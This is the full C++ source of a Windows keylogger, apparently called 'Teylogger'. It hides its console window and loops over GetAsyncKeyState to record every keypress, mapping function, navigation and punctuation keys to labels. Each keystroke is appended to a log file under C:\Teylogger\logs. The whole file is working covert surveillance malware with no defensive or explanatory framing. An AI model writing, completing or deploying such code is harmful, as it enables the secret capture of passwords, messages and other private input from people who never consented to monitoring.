#include <cstdio>
#include <ctime>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>
using namespace std;
void save(string data) {
    fstream file;
    file.open("C:\\Teylogger\\logs\\temp.txt", ios::app);
    file << data;
    file.close();
};
string special(int key) {
    string result;
    switch(key) {
        case VK_F1:
            result = "[F1]";
            break;
        case VK_F2:
            result = "[F2]";
            break;
        case VK_F3:
            result = "[F3]";
            break;
        case VK_F4:
            result = "[F4]";
            break;
        case VK_F5:
            result = "[F5]";
            break;
        case VK_F6:
            result = "[F6]";
            break;
        case VK_F7:
            result = "[F7]";
            break;
        case VK_F8:
            result = "[F8]";
            break;
        case VK_F9:
            result = "[F9]";
            break;
        case VK_F10:
            result = "[F10]";
            break;
        case VK_F11:
            result = "[F11]";
            break;
        case VK_F12:
            result = "[F12]";
            break;
        case VK_F13:
            result = "[F13]";
            break;
        case VK_F14:
            result = "[F14]";
            break;
        case VK_F15:
            result = "[F15]";
            break;
        case VK_F16:
            result = "[F16]";
            break;
        case VK_F17:
            result = "[F17]";
            break;
        case VK_F18:
            result = "[F18]";
            break;
        case VK_F19:
            result = "[F19]";
            break;
        case VK_F20:
            result = "[F20]";
            break;
        case VK_F21:
            result = "[F21]";
            break;
        case VK_F22:
            result = "[F22]";
            break;
        case VK_F23:
            result = "[F23]";
            break;
        case VK_F24:
            result = "[F24]";
            break;
        case VK_PAUSE:
            result = "[PAUSE]";
            break;
        case VK_SCROLL:
            result = "[SCROLL LOCK]";
            break;
        case VK_SNAPSHOT:
            result = "[PRINT SCREEN]";
            break;
        case VK_LWIN:
            result = "[L WIN]";
            break;
        case VK_RWIN:
            result = "[R WIN]";
            break;
        case VK_RETURN:
            result = "[ENTER]";
            break;
        case VK_BACK:
            result = "[BACKSPACE]";
            break;
        case VK_CAPITAL:
            result = "[CAPS LOCK]";
            break;
        case VK_NUMLOCK:
            result = "[NUM LOCK]";
            break;
        case VK_HOME:
            result = "[HOME]";
            break;
        case VK_INSERT:
            result = "[INSERT]";
            break;
        case VK_END:
            result = "[END]";
            break;
        case VK_PRIOR:
            result = "[PAGE UP]";
            break;
        case VK_NEXT:
            result = "[PAGE DOWN]";
            break;
        case VK_LSHIFT:
            result = "[L SHIFT]";
            break;
        case VK_RSHIFT:
            result = "[R SHIFT]";
            break;
        case VK_TAB:
            result = "[TAB]";
            break;
        case VK_LCONTROL:
            result = "[L CONTROL]";
            break;
        case VK_RCONTROL:
            result = "[R CONTROL]";
            break;
        case VK_LMENU:
            result = "[L ALT]";
            break;
        case VK_RMENU:
            result = "[R ALT]";
            break;
        case VK_ESCAPE:
            result = "[ESC]";
            break;
        case VK_DELETE:
            result = "[DELETE]";
            break;
        case VK_UP:
            result = "[UP]";
            break;
        case VK_DOWN:
            result = "[DOWN]";
            break;
        case VK_LEFT:
            result = "[LEFT]";
            break;
        case VK_RIGHT:
            result = "[RIGHT]";
            break;
        case VK_NUMPAD0:
            result = "0";
            break;
        case VK_NUMPAD1:
            result = "1";
            break;
        case VK_NUMPAD2:
            result = "2";
            break;
        case VK_NUMPAD3:
            result = "3";
            break;
        case VK_NUMPAD4:
            result = "4";
            break;
        case VK_NUMPAD5:
            result = "5";
            break;
        case VK_NUMPAD6:
            result = "6";
            break;
        case VK_NUMPAD7:
            result = "7";
            break;
        case VK_NUMPAD8:
            result = "8";
            break;
        case VK_NUMPAD9:
            result = "9";
            break;
        case VK_OEM_COMMA:
            result = ",";
            break;
        case VK_ADD:
            result = "+";
            break;
        case VK_OEM_PLUS:
            result = "+";
            break;
        case VK_SUBTRACT:
            result = "-";
            break;
        case VK_OEM_MINUS:
            result = "-";
            break;
        case VK_DIVIDE:
            result = "/";
            break;
        case VK_MULTIPLY:
            result = "*";
            break;
        case VK_DECIMAL:
            result = ".";
            break;
        case VK_OEM_PERIOD:
            result = ".";
            break;
        case VK_OEM_1:
            result = "[;:]";
            break;
        case VK_OEM_2:
            result = "[/?]";
            break;
        case VK_OEM_3:
            result = "~";
            break;
        case VK_OEM_4:
            result = "[[{]";
            break;
        case VK_OEM_5:
            result = "[\\|]";
            break;
        case VK_OEM_6:
            result = "[]}]";
            break;
        case VK_OEM_7:
            result = "['\"]";
            break;
        case VK_OEM_102:
            result = "[<>]";
            break;
        default: break;
    };
    return result;
};
int main() {
    int specials[] = { VK_F1, VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12, VK_F13, VK_F14, VK_F15, VK_F16, VK_F17, VK_F18, VK_F19, VK_F20, VK_F21, VK_F22, VK_F23, VK_F24, VK_PAUSE, VK_SCROLL, VK_SNAPSHOT, VK_LWIN, VK_RWIN, VK_RETURN, VK_BACK, VK_CAPITAL, VK_NUMLOCK, VK_HOME, VK_INSERT, VK_END, VK_PRIOR, VK_NEXT, VK_LSHIFT, VK_RSHIFT, VK_TAB, VK_LCONTROL, VK_RCONTROL, VK_LMENU, VK_RMENU, VK_ESCAPE, VK_DELETE, VK_UP, VK_DOWN, VK_LEFT, VK_RIGHT, VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9, VK_OEM_COMMA, VK_ADD, VK_OEM_PLUS, VK_SUBTRACT, VK_OEM_MINUS, VK_DIVIDE, VK_MULTIPLY, VK_DECIMAL, VK_OEM_PERIOD, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_OEM_102 };
    string specials_;
    bool is;
    HWND window = GetConsoleWindow();
    ShowWindow(window, SW_HIDE);
    while(true) {
        Sleep(10);
        for(int key = 8; key <= 190; key ++) {
            if(GetAsyncKeyState(key) == -32767) {
                is = find(begin(specials), end(specials), key) == end(specials);
                if(is) {
                    if(GetKeyState(VK_CAPITAL)) {
                        save(string(1, (char)key));
                    } else {
                        save(string(1, (char)tolower(key)));
                    };
                } else {
                    specials_ = special(key);
                    save(specials_);
                };
            };
        };
    };
    return 0;
};